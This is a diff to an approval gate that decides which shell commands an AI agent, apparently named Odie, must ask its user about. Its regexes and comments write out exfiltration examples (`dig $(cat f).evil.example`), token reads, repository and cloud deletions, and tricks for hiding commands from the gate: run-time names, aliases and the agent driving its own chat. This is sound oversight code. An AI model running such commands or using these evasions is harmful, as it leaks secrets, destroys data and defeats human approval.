@@ -40,6 +40,9 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
     ("deletes or stops something", re.compile(
         r"(^|[;&|(`]\s*|\s)(rm|rmdir|kill|pkill|killall|sudo|chmod|chown|dd|mkfs|shutdown|reboot|launchctl|truncate|"
         r"shred|mv|crontab|trash|diskutil)\b|\bgit\s+(push|reset|clean|rebase|checkout\s+--)|"
+        # every push, past git's own options too (git -C x push --force, git push origin :old): it can replace or
+        # delete what is on the other side (18 Nov 2026)
+        r"\bgit\b[^|;&\n]*\spush\b|"
         r"\bfind\b[^|;&\n]*\s-delete\b|\b(uninstall|prune)\b|"
         r"\bos\.(remove|unlink|rmdir|kill)\b|\bshutil\.(rmtree|move)\b|\.unlink\(|\.rmdir\(|"
         r"\.(rm|rmSync|unlinkSync|rmdirSync)\(|\bsubprocess\b|\bos\.system\b|child_process|"
@@ -47,7 +50,12 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"\.(system|popen|spawn\w*|posix_spawn\w*|exec[lv]p?e?)\s*\(\s*[^)\s]|_get_command_stdout|"
         # a DELETE sent anywhere, this computer too (it deletes a local model): curl -X DELETE, wget --method=DELETE
         r"\b(curl|wget)\b[^|;&\n]*(-[a-zA-Z]*X\s*(?i:delete)\b|--request\s+(?i:delete)\b|--method[=\s]+(?i:delete)\b)|"
-        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*\b(?i:delete)\b")),
+        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*\b(?i:delete)\b|"
+        # cloud and container tools that delete or stop (18 Nov 2026): aws ec2 terminate-instances, terraform destroy,
+        # kubectl delete, docker stop, docker compose down
+        r"\b(aws|gcloud|gsutil|az|doctl|kubectl|helm|terraform|tofu|pulumi|supabase|heroku|flyctl|fly|vercel|netlify|firebase|"
+        r"wrangler)\b[^|;&\n]*\s(delete[\w-]*|destroy|terminate[\w-]*|rb|remove[\w-]*|apps:destroy|drain)\b|"
+        r"\b(docker|podman)\b[^|;&\n]*\s(stop|kill|rmi?|down|restart)\b")),
     ("sends data out", re.compile(
         r"\bcurl\b[^|;]*(-[a-zA-Z]*X\s*(POST|PUT|PATCH|DELETE)|--request\s+(POST|PUT|PATCH|DELETE)|--data|--json|"
         r"\s-[a-zA-Z]*[dFTK](\s|\S)|--form|--upload|--config)|\bwget\b[^|;]*(--post|--body|--method)|"
@@ -61,12 +69,23 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"\bgh\s+(repo\s+(create|fork)|gist\s+create)\b|"
         r"\burlopen\s*\([^)]*,|\bRequest\s*\(|\bhttp\.client\b|\bHTTPS?Connection\b|\baiohttp\b|\burllib3\b|"
         r"\bsocket\.(socket|create_connection)\b|\bhttps?\.request\s*\(|\bbody\s*:\s*[^\s,}]|"
-        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*(\b(?i:post|put|patch|delete)\b|\s[\w.@-]+:?=\S*|\s(-f|--form|--raw)\b)")),
+        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*(\b(?i:post|put|patch|delete)\b|\s[\w.@-]+:?=\S*|\s(-f|--form|--raw)\b)|"
+        # Publishing, deploying, cloud tools that write, and opening this computer to the network (18 Nov 2026): docker
+        # push, twine upload, cargo/poetry/uv publish, hf upload, a hosting tool (vercel deploys by default), aws s3 cp,
+        # kubectl apply, terraform apply (and their deletes: a request sent to delete there), python3 -m http.server, ngrok,
+        # tailscale funnel.
+        r"\bdocker\s+(push|login)\b|\b(twine|gem)\s+(upload|push)\b|\b(cargo|poetry|uv|pdm|hatch|flit|yarn|pnpm|bun)\s+publish\b|"
+        r"\b(hf|huggingface-cli)\s+upload\w*\b|(?<![\w./-])(vercel|netlify|firebase|wrangler|flyctl|fly|railway|surge|heroku)(?=\s|$)|"
+        r"\b(aws|gcloud|gsutil|az|doctl|kubectl|helm|terraform|tofu|pulumi|supabase)\b[^|;&\n]*\s(cp|mv|sync|rsync|put[\w-]*|"
+        r"create[\w-]*|update[\w-]*|set[\w-]*|apply|deploy|publish|push|upload|invoke|send[\w-]*|run|exec|ssh|scp|login|import|"
+        r"replace|patch|scale|rollout|install|upgrade|up|delete[\w-]*|destroy|terminate[\w-]*|remove[\w-]*|rb|drain)\b|"
+        r"\bhttp\.server\b|(?<![\w./-])(ngrok|cloudflared|localtunnel)(?=\s|$)|\btailscale\s+(funnel|serve|file)\b")),
     # An address built at run time carries whatever was put into it: curl 'https://x/?d='$(cat f), wget "$URL$DATA",
     # requests.get(base + secret), urlopen(f"...{key}"). Only a fixed address is a plain read.
     # A name looked up or opened carries it too: dig $(cat f).evil.example, open 'https://x/?d='$(cat f).
     ("sends data out (an address built from other text)", re.compile(
         r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client|dig|nslookup|host|ping)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
+        r"\bgit\s+(clone|fetch|pull|ls-remote|submodule\s+add)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
         r"\bopen\s+['\"]?https?://[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
         r"\b(requests\.(get|head)|httpx\.(get|head)|urlopen|urlretrieve|fetch|axios\.get|http\.get|https\.get)\s*\([^)]*"
         r"(\+|\bf['\"]|\.format\(|%\s*\(|\$\{|`)")),
@@ -99,7 +118,8 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"\b(npm|pnpm|yarn|bun)\s+(i|install|add|ci|up|update|upgrade|exec|x)\b|\bnpx\b|\bpip3?\s+(install|download)\b|"
         r"\buv\s+(pip\s+install|add|sync|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
         r"\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get|run)\b|\bconda\s+install\b|\bport\s+install\b|"
-        r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b")),
+        r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b|"
+        r"\b(docker|podman)\s+(run|pull|build|compose\s+up)\b")),  # fetches an image and runs it (18 Nov 2026)
     ("edits files in place", re.compile(r"\b(sed|perl)\s+(-\w*\s+)*-i|\btee\b")),
 ]
 # Odie's own home (settings, chats, keys, the audit log, the live copy it runs from), except the workspace it writes
@@ -1724,6 +1744,291 @@ def hidden_below(folder: str) -> bool:
     return False
 
 
+# ── GitHub's gh, Odie's own command, and a command named at run time (18 Nov 2026) ──────────────────────────────────
+# Smart let `gh repo delete`, `gh pr merge --admin`, `gh api -X DELETE …` and `gh auth token` run with no card, and
+# `odie chat …` from Odie's own shell could drive Odie's chat. Under gh only plainly read-only use runs free now; the rest
+# asks as sending out (and as deleting too for its delete kinds), and anything that shows or handles his GitHub
+# credentials asks as reading secrets. Any `odie` command asks as Odie itself. A command whose name is filled in at run
+# time (`G=gh; $G repo delete x`), or an alias that renames one, can't be read, so it asks as text run as commands.
+# Each is read wherever the word stands, so `sh -c "…"`, `$(…)`, `xargs gh`, `env X=1 gh`, `command gh` and quoting
+# tricks (read again squeezed) don't hide it.
+
+READS_SECRETS = "reads secrets"
+SENDS_OUT = "sends data out"
+DELETES = "deletes or stops something"
+SENDS_BUILT = "sends data out (an address built from other text)"
+RUNS_TEXT = "runs text as commands"
+RUNS_ODIE = "runs Odie itself (its own command)"
+
+# gh as a word, by its name or a path to it (/opt/homebrew/bin/gh); not part of a longer name (ghostty, gh-pages).
+_GH = re.compile(r"(?<![\w.@-])(?:[\w.~/-]*/)?gh(?=$|[\s;&|)`'\"<>])")
+# Where one command ends: ; && || | & ) ` and line ends, but not the & of 2>&1 or &>, nor the | of >|.
+_COMMAND_END = re.compile(r"&&|\|\||;|\n|(?<!>)\||(?<![>&|])&(?![>&])|\)|`")
+# A redirect and its target (> f, 2>&1, >> "a b", < in.json, <<'EOF'): not words handed to the command.
+_ANY_REDIRECT = re.compile(r"(\d*|&)(<<<|<<-?|<|>>|>)[&|]?\s*(?:'[^']*'|\"[^\"]*\"|[^\s;&|<>'\"])*")
+# Text filled in at run time: $X, ${X}, $(…), `…` (but $HOME is the home).
+_RUN_TIME_TEXT = re.compile(r"\$(?!HOME\b|\{HOME\})|`")
+# jq's env and $ENV print every variable, a token among them: `gh pr view 3 --json title --jq 'env'`.
+_JQ_ENV = re.compile(r"\benv\b|\$ENV\b")
+
+GH_READS: dict[str, frozenset[str]] = {
+    "pr": frozenset({"view", "list", "diff", "checks", "status"}),
+    "issue": frozenset({"view", "list", "status"}),
+    "repo": frozenset({"view", "list"}),
+    "run": frozenset({"view", "list", "watch"}),
+    "release": frozenset({"view", "list"}),
+}
+_GH_FREE_GROUPS = frozenset({"search", "browse"})  # search only reads; browse opens a page (it ran free before too)
+_GH_HELP = frozenset({"help", "--help", "-h", "--version", "version"})
+_GH_DELETE_WORDS = frozenset({"delete", "delete-asset", "close", "cancel", "archive", "remove", "logout", "lock"})
+_GH_API_FLAGS = frozenset({"--paginate", "--slurp", "-i", "--include", "--silent", "--verbose"})
+_GH_API_VALUES = frozenset({"-q", "--jq", "-t", "--template", "--cache", "-p", "--preview", "-X", "--method"})
+_GH_AUTH_STATUS_FLAGS = frozenset({"-a", "--active"})
+_GH_AUTH_STATUS_VALUES = frozenset({"-h", "--hostname"})
+
+
+def gh_commands(text: str) -> list[list[str]]:
+    """The words after each `gh` in the text, up to where that command ends (_COMMAND_END outside quotes), redirects
+    left out; when the words can't be split as the shell would (a quote left open by `sh -c "…"`), its quotes are
+    dropped and it is split at spaces, so it reads as more words, never fewer.
+      `gh pr view 3 | head` -> [["pr", "view", "3"]];  `sh -c "gh repo delete x; ls"` -> [["repo", "delete", "x;",
+      "ls"]];  `gh api repos/a/b > out.json` -> [["api", "repos/a/b"]];  `ls ~/work` -> []."""
+    contexts = char_contexts(text)
+    ansi_quotes = "$'" in text  # $'a\';' is one word to zsh, but its \' looks like a closing quote here: never cut
+    found = []
+    for gh in _GH.finditer(text):
+        end = len(text)
+        for cut in _COMMAND_END.finditer(text, gh.end()):
+            if ansi_quotes:
+                break
+            if contexts[cut.start()] == "plain":
+                end = cut.start()
+                break
+        rest = _ANY_REDIRECT.sub(" ", text[gh.end():end])
+        try:
+            words = shlex.split(rest)
+        except ValueError:
+            words = re.sub(r"['\"\\]", " ", rest).split()
+        found.append(words)
+    return found
+
+
+def gh_reasons(args: list[str]) -> list[str]:
+    """Why one gh command asks, from the words after `gh`; [] when it only reads. Free: `pr view|list|diff|checks|
+    status`, `issue view|list|status`, `repo view|list`, `run view|list|watch`, `release view|list`, `search …`,
+    `browse`, `api` as a plain GET (gh_api_reads_only), `auth status` without its token, help and version. Anything
+    else asks as sending out, with deleting first for its delete kinds; `auth`, `secret` and `config` ask as reading
+    secrets (gh_auth_reasons); words filled in at run time, or jq's env, ask too.
+      ["pr", "view", "3"] -> [];  ["api", "repos/a/b"] -> [];  ["pr", "merge", "3", "--admin"] -> ["sends data out"];
+      ["repo", "delete", "me/app", "--yes"] -> ["deletes or stops something", "sends data out"];
+      ["api", "-X", "DELETE", "repos/a/b"] -> ["deletes or stops something", "sends data out"];
+      ["auth", "token"] -> ["reads secrets"];  ["co", "3"] (an alias or extension) -> ["sends data out"];
+      ["search", "code", "$(cat notes.md)"] -> ["sends data out (an address built from other text)"]."""
+    if not args:
+        return []  # bare gh prints its help
+    group = args[0]
+    action = ""
+    if len(args) > 1:
+        action = args[1]
+    if group == "auth":
+        reasons = gh_auth_reasons(args[1:])
+    elif group in ("secret", "config"):
+        reasons = [READS_SECRETS]  # `gh config get` can print a stored token
+    elif gh_only_reads(group, action, args[1:]):
+        reasons = []
+    else:
+        reasons = [SENDS_OUT]
+        if group == "api":
+            deletes = gh_api_method(args[1:]) == "DELETE"
+        else:
+            deletes = any(a in _GH_DELETE_WORDS for a in args[:3])
+        if deletes:
+            reasons.insert(0, DELETES)
+    if not reasons and any(_JQ_ENV.search(a) for a in args):
+        reasons = [READS_SECRETS]  # a read that prints every variable through jq
+    if any(_RUN_TIME_TEXT.search(a) for a in args) and SENDS_BUILT not in reasons:
+        reasons.append(SENDS_BUILT)
+    return reasons
+
+
+def gh_only_reads(group: str, action: str, rest: list[str]) -> bool:
+    """Whether a gh command (its group, the word after it, and every word after the group) only reads: help or
+    version, search or browse, a read action of its group (GH_READS), or a plain GET with `api`.
+      ("pr", "view", ["view", "3"]) -> True;  ("search", "prs", […]) -> True;  ("api", "repos/a/b", ["repos/a/b"]) ->
+      True;  ("pr", "merge", ["merge", "3"]) -> False;  ("api", "-X", ["-X", "POST", "x"]) -> False."""
+    if group in _GH_HELP or group in _GH_FREE_GROUPS:
+        return True
+    if action in GH_READS.get(group, frozenset()):
+        return True
+    return group == "api" and gh_api_reads_only(rest)
+
+
+def gh_auth_reasons(args: list[str]) -> list[str]:
+    """Why a `gh auth …` command asks (the words after `auth`): status without its token runs free; token, status
+    showing the token, or anything this reading doesn't know asks as reading secrets; login, refresh and switch talk to
+    GitHub with his credentials (sending out); logout deletes them too.
+      [] -> [];  ["status"] -> [];  ["status", "-h", "github.com"] -> [];  ["status", "-t"] -> ["reads secrets"];
+      ["token"] -> ["reads secrets"];  ["login"] -> ["sends data out"];  ["logout"] -> ["deletes or stops something",
+      "sends data out"];  ["setup-git"] -> ["reads secrets"]."""
+    if not args:
+        return []  # its help
+    action = args[0]
+    if action == "status":
+        if gh_auth_status_plain(args[1:]):
+            return []
+        return [READS_SECRETS]
+    if action in ("login", "refresh", "switch"):
+        return [SENDS_OUT]
+    if action == "logout":
+        return [DELETES, SENDS_OUT]
+    return [READS_SECRETS]
+
+
+def gh_auth_status_plain(args: list[str]) -> bool:
+    """Whether `gh auth status`'s options are only ones that keep the token hidden (-a, --active, -h/--hostname X).
+    [] -> True;  ["-h", "github.com"] -> True;  ["--hostname=github.com"] -> True;  ["-t"] -> False;
+    ["--show-token"] -> False;  ["-at"] -> False;  ["--json", "hosts"] -> False (an option it doesn't know)."""
+    at = 0
+    while at < len(args):
+        word = args[at]
+        at += 1
+        name = word.split("=", 1)[0]
+        if word in _GH_AUTH_STATUS_FLAGS:
+            continue
+        if name in _GH_AUTH_STATUS_VALUES:
+            if "=" not in word:
+                at += 1  # its value is the next word
+            continue
+        return False
+    return True
+
+
+def gh_api_method(args: list[str]) -> str:
+    """The method a `gh api` command names (-X / --method, joined or not), in capitals, or "" when it names none:
+    ["-X", "delete", "x"] -> "DELETE";  ["-XPOST", "x"] -> "POST";  ["--method=GET", "x"] -> "GET";  ["x"] -> ""."""
+    method = ""
+    at = 0
+    while at < len(args):
+        word = args[at]
+        at += 1
+        if word in ("-X", "--method") and at < len(args):
+            method = args[at]
+            at += 1
+        elif word.startswith(("-X=", "--method=")):
+            method = word.split("=", 1)[1]
+        elif word.startswith("-X"):
+            method = word[2:]
+    return method.upper()
+
+
+def gh_api_reads_only(args: list[str]) -> bool:
+    """Whether a `gh api` command (the words after `api`) is a plain GET of one address: no method but GET, no
+    fields, input or headers (-f, -F, --field, --raw-field, --input, -H), not graphql, and only options this reading
+    knows (_GH_API_FLAGS, _GH_API_VALUES), so the whole command is read exactly.
+      ["repos/a/b/pulls"] -> True;  ["-X", "GET", "repos/a/b", "--jq", ".[].title"] -> True;  ["--paginate",
+      "repos/a/b/issues"] -> True;  ["-X", "POST", "repos/a/b/issues"] -> False;  ["repos/a/b", "-f", "x=1"] -> False;
+      ["graphql", "-f", "query=…"] -> False;  ["-XDELETE", "repos/a/b"] -> False;  ["-iXPOST", "x"] -> False;
+      ["-H", "X-HTTP-Method-Override: DELETE", "x"] -> False;  ["a", "b"] -> False (two addresses);
+      ["https://example.com/x"] -> False (another host);  ["https://api.github.com/user"] -> True."""
+    addresses = []
+    at = 0
+    while at < len(args):
+        word = args[at]
+        at += 1
+        if not word.startswith("-") or word == "-":
+            addresses.append(word)
+            continue
+        name = word.split("=", 1)[0]
+        if name in _GH_API_FLAGS and "=" not in word:
+            continue
+        if name not in _GH_API_VALUES:
+            if word.startswith("-X") and word[2:].upper() == "GET":
+                continue  # -XGET
+            return False
+        value = ""
+        if "=" in word:
+            value = word.split("=", 1)[1]
+        elif at < len(args):
+            value = args[at]
+            at += 1
+        if name in ("-X", "--method") and value.upper() != "GET":
+            return False
+    if len(addresses) != 1 or addresses[0] == "graphql":
+        return False
+    address = addresses[0]
+    return "://" not in address or address.startswith("https://api.github.com/")  # GitHub's API, not another host
+
+
+# Where a word is the command itself: the start of the text or of a piece, after $( ( { ` ! or a shell's -c, after
+# then / do / else / if / while / until or find's -exec, past NAME=value words and the wrappers that run what follows.
+_COMMAND_START = (r"(?:^|[;&|({`!\n]|\$\(|\b(?:then|do|else|elif|if|while|until)\s|\s-(?:exec|execdir|ok|okdir)\s|"
+                  r"\b(?:sh|bash|zsh|dash|ksh|fish)\s+(?:-\w+\s+)*-\w*c\s+[\"']?)\s*"
+                  r"(?:(?:\w+=\S*|command|builtin|exec|nohup|time|env|nice|noglob|nocorrect|xargs|sudo|uv\s+run|uvx|"
+                  r"pipx\s+run|-\S+)\s+)*")
+# The odie command's own subcommands (odie/cli.py): `odie` followed by one of them is Odie's command wherever it stands
+# (timeout 5 odie chat …, watch odie status).
+ODIE_SUBCOMMANDS = ("start", "stop", "restart", "status", "pair", "logs", "open", "update", "doctor", "uninstall",
+                    "serve", "write-command", "chat", "threads", "show")
+# Odie's command: `odie …` where a command stands (or opening a quoted line, as AppleScript's do shell script "odie …"),
+# followed by one of its subcommands anywhere, by a path to a bin folder (~/.local/bin/odie, .venv/bin/odie), or its
+# Python module (python -m odie.cli).
+_ODIE_COMMAND = re.compile(
+    _COMMAND_START + r"[\"']?(?:\S*/)?odie(?=$|[\s;&|)`'\"<>])|[\"']odie(?=$|[\s;&|)`'\"<>])|/bin/odie(?![\w.-])|"
+    r"\bodie\.cli\w*\b|(?<![\w./-])odie\s+(?:" + "|".join(ODIE_SUBCOMMANDS) + r")(?=$|[\s;&|)`'\"<>])|"
+    r"\bpython[\d.]*\s+(?:-\S+\s+)*\S*odie/cli\w*\.py\b", re.MULTILINE)
+# A command whose name is filled in at run time: `$G repo delete`, `"${X}" x`, `$(which gh) …`, `` `which rm` x ``.
+_NAMED_AT_RUN_TIME = re.compile(_COMMAND_START + r"[\"']?(?:\$(?!HOME\b|\{HOME\}|\(\()[{\w(~=!#@*?-]|`)", re.MULTILINE)
+# Giving a command another name: an alias or hash entry (alias g=gh), a git alias (git -c alias.p=push p), or its path
+# taken at run time to copy or run it under another name (cp $(which gh) /tmp/x; /tmp/x repo delete y).
+_RENAMES_A_COMMAND = re.compile(r"\b(alias|hash)\s+(?:-\w+\s+)*['\"]?[\w.:-]+=|\bgit\b[^|;&\n]*\balias\.|"
+                                r"(?:\$\(|`)\s*(?:which|whence|whereis|type|command\s+-[vV])\b")
+_SHELL_HEREDOC = re.compile(r"\b(sh|bash|zsh|dash|ksh|fish)\b[^|;&\n]*<<")
+
+
+def runs_odie(text: str) -> bool:
+    """Whether the text runs Odie's own command, which could drive its chat, change it or stop it: `odie chat hi` ->
+    True;  `sh -c "odie threads"` -> True;  `~/.local/bin/odie status` -> True;  `python -P -m odie.cli show x` ->
+    True;  `cd ~/work/odie && ls` -> False;  `grep -rn x odie` -> False (a folder named odie);  `ls odie-mac` -> False."""
+    return _ODIE_COMMAND.search(text) is not None
+
+
+def command_hidden_by_name(shell: str, code: str = "") -> bool:
+    """Whether the command runs something whose name the rules can't read: a command named by a variable or a
+    substitution, or a name given by alias, hash or a git alias. Heredoc code counts only when a shell reads it (a
+    node template's `${x}` is not a command).
+      `G=gh; $G repo delete x` -> True;  `"$R" -rf x` -> True;  `$(which gh) repo delete x` -> True;
+      `alias g=gh` -> True;  `git -c alias.p=push p` -> True;  `echo "$X"` -> False;  `$HOME/bin/tool x` -> False;
+      `echo $((1 + 2))` -> False;  `bash <<'EOF'` + `$R x` -> True;  `node <<'EOF'` + `` `${a}` `` -> False."""
+    texts = [shell]
+    if code and _SHELL_HEREDOC.search(shell):
+        texts.append(code)
+    for text in texts:
+        if _NAMED_AT_RUN_TIME.search(text) or _RENAMES_A_COMMAND.search(text):
+            return True
+    return False
+
+
+def named_command_reasons(shell: str, code: str) -> list[str]:
+    """The reasons the gh, odie and named-at-run-time readings find in a command, read as written and squeezed, each
+    once: `gh repo delete x` -> ["deletes or stops something", "sends data out"];  `odie chat hi` -> ["runs Odie itself
+    (its own command)"];  `g''h auth token` -> ["reads secrets"];  `gh pr view 3` -> []."""
+    reasons: list[str] = []
+    text = f"{shell}\n{code}"
+    for reading in (text, squeezed(text)):
+        found = []
+        for args in gh_commands(reading):
+            found.extend(gh_reasons(args))
+        if runs_odie(reading):
+            found.append(RUNS_ODIE)
+        for why in found:
+            if why not in reasons:
+                reasons.append(why)
+    hidden = command_hidden_by_name(shell, code) or command_hidden_by_name(squeezed(shell), squeezed(code))
+    if hidden and RUNS_TEXT not in reasons:
+        reasons.append(RUNS_TEXT)
+    return reasons
+
+
 def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None,
                scratch_dirs: tuple[str, ...] = (), smart: bool = False, own_port: int | None = None,
                odie_dirs: tuple[str, ...] = ()) -> str | None:
@@ -1756,7 +2061,11 @@ def reasons_to_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | Non
     `smart` (17 Nov 2026) reads seven kinds of ordinary work plainly too, in Smart mode only: reading Odie's code
     (reads_only_odies_code), a pipe into a program written in the command and find's -prune (smart_blanked), reading
     what runs at login and sending to this computer except Odie's own port `own_port` (smart_views), and a new file in
-    an ordinary folder outside `odie_dirs` (write_reason). Careful's pass reads every command as before."""
+    an ordinary folder outside `odie_dirs` (write_reason). Careful's pass reads every command as before.
+    In both modes (18 Nov 2026) gh runs free only for plain reads, `odie` always asks, and a command named at run time or
+    renamed by an alias asks (named_command_reasons): `gh pr view 3` -> []; `gh repo delete x` -> ["deletes or stops
+    something", "sends data out"]; `odie chat hi` -> ["runs Odie itself (its own command)"]; `G=gh; $G repo delete x`
+    -> ["runs text as commands"]."""
     shell, code = split_heredocs(command)
     reasons: list[str] = []
 
@@ -1781,6 +2090,8 @@ def reasons_to_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | Non
                 text = squeezed(text)
             if rule.search(text):
                 note(why)
+    for why in named_command_reasons(shell_read, code):
+        note(why)  # gh, odie, and a command named at run time (18 Nov 2026)
     if hidden_path_by_pattern(shell_read, safe_dirs):
         note("reaches a hidden file by a pattern")
     write_why = write_reason(shell_read, safe_dirs, cwd, smart, odie_dirs, code)
